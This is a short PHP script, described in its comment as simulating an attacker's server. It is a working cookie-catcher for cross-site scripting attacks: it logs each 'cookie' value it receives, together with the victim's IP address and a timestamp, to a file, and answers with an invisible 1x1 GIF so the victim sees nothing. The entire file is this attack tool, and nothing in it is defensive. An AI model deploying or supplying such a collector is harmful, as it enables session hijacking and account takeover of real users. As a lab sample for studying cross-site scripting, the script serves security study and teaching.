<?php
// This script simulates an attacker's server that logs stolen session tokens.
if (isset($_GET['cookie'])) {
    $stolen_cookie = $_GET['cookie'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');
    
    $log_entry = "[$date] IP: $ip | Cookie: $stolen_cookie" . PHP_EOL;
    file_put_contents('stolen_cookies.txt', $log_entry, FILE_APPEND);
    
    // Transparent 1x1 pixel image so the user doesn't see much
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
}
?>
